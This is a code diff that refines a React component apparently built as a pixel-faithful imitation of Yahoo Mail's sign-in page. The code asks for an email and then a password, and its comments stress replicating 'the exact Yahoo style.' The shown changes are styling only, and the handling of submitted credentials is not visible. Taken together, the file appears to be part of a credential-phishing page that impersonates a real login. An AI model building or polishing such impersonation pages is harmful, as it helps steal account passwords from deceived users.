@@ -8,15 +8,15 @@ interface YahooLoginPageProps {
   onLoginError?: (error: string) => void;
 }
 
-// A new, rebuilt Input component for a perfect match
+// Custom Input component to replicate the exact Yahoo style
 const YahooFloatingLabelInput = ({ value, onChange, placeholder, type = "text", autoFocus = false }: any) => {
   const [isFocused, setIsFocused] = useState(false);
   const hasValue = value.length > 0;
 
   return (
-    <div className="relative mt-2 h-12">
+    <div className="relative mt-1 h-12">
       <label
-        className={`absolute left-1 transition-all duration-200 ease-in-out pointer-events-none 
+        className={`absolute left-1 transition-all duration-200 ease-in-out pointer-events-none z-0
           ${(isFocused || hasValue) ? 'text-xs top-0 text-gray-500' : 'text-base top-3 text-gray-500'}`}
       >
         {placeholder}
@@ -38,7 +38,6 @@ const YahooFloatingLabelInput = ({ value, onChange, placeholder, type = "text", 
     </div>
   );
 };
-
 
 const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
   const [email, setEmail] = useState('');
@@ -73,7 +72,9 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
       </header>
 
       <main className="flex-grow w-full flex justify-center px-4 pt-24">
-        <div className="w-full max-w-7xl flex justify-between items-start">
+        {/* Main container now centers its children with a specific gap */}
+        <div className="w-full max-w-7xl flex justify-center items-start md:gap-x-20">
+          
           <div className="hidden md:block pt-12">
             <h1 className="text-3xl font-semibold text-gray-900 mb-4 tracking-tight whitespace-nowrap">
               Yahoo makes it easy to enjoy what matters most in your world.
@@ -82,14 +83,21 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
               Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.
             </p>
           </div>
+
+          {/* Card container with increased width */}
           <div className="w-full md:w-auto flex-shrink-0">
-            <div className="w-full max-w-[360px] mx-auto py-7 px-8 bg-white rounded-2xl" style={{ boxShadow: '0 4px 60px rgba(0,0,0,.1)' }}>
+            <div 
+              className="w-full max-w-[400px] mx-auto py-7 px-8 bg-white rounded-2xl" 
+              style={{ boxShadow: '0 4px 60px rgba(0,0,0,.1)' }}
+            >
               <YahooLogo className="h-9 mx-auto mt-2 mb-6" />
+              
               <h2 className="text-center text-[22px] font-bold text-gray-900">
                 {!showPasswordStep ? 'Sign in to Yahoo Mail' : 'Enter password'}
               </h2>
               <p className="text-center text-sm text-gray-500 mt-1">using your Yahoo account</p>
               {showPasswordStep && ( <div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div> )}
+              
               <form onSubmit={handleSubmit} className="mt-5 space-y-4">
                 {errorMessage && !isLoading && ( <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p> )}
                 {!showPasswordStep ? (
@@ -106,6 +114,7 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
                   </div>
                 )}
               </form>
+
               <div className="text-xs mt-4 flex justify-between items-center">
                 <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
                   <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 border-gray-300 rounded focus:ring-purple-500" defaultChecked />
@@ -113,6 +122,7 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
                 </label>
                 <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-xs text-[#6300be] hover:underline font-medium">Forgot username?</a>
               </div>
+              
               <div className="mt-6 space-y-3">
                 <a href="https://login.yahoo.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-[#8a2be2] text-[#8a2be2] font-semibold rounded-full hover:bg-purple-50 transition-colors">Create an account</a>
                 <div className="relative text-center my-1.5">
